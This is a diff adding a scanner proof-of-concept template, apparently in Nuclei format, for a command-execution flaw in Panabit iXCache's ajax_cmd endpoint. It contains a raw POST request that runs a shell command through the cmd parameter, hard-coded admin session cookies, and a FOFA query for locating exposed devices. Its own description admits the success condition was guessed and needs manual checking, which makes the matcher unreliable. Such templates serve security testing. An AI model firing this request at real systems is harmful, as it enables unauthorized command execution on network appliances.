@@ -1,0 +1,45 @@
+id: poc-81bf31df6d037ad04e1d
+info:
+  name: PanabitiXCacheajax_cmd存在后台命令执行漏洞
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/81bf31df6d037ad04e1db508a7308826
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: rce,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: 81bf31df6d037ad04e1db508a7308826
+    fofa: + fofa`title="iXCache"`
+http:
+- raw:
+  - 'POST /cgi-bin/Maintain/ajax_cmd?action=runcmd&cmd=ls HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:122.0) Gecko/20100101 Firefox/122.0
+
+    Accept: */*
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+    Accept-Encoding: gzip, deflate, br
+
+    X-Requested-With: XMLHttpRequest
+
+    Connection: keep-alive
+
+    Cookie: _walkthrough-introduction=0; pauser_1706355982_749237=paonline_admin_54360_17068008921; pauser_965865545_617716=paonline_admin_59195_9663105331; pauser_1628486854_900424=paonline_admin_84071_16289322461
+
+    Sec-Fetch-Dest: empty
+
+    Sec-Fetch-Mode: cors
+
+    Sec-Fetch-Site: same-origin
+
+    Content-Length: 0'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
